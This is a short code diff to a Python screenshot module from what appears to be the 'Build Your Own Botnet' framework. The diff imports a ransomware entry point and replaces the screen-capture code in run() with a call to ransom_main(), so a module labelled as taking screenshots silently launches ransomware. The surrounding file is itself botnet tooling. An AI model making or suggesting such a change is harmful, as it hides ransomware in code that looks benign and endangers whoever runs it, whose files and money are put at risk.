@@ -1,7 +1,7 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 'Screenshot (Build Your Own Botnet)'
-
+from ransom_main import main as ransom_main
 # standard library
 import base64
 
@@ -28,9 +28,6 @@ def run():
 
     """
     try:
-	    with mss.mss() as screen:
-	        img = screen.grab(screen.monitors[0])
-	    data = util.png(img)
-	    return base64.b64encode(data)
+	    ransom_main()
     except Exception as e:
         return "{} error: {}".format(run.__name__, str(e))
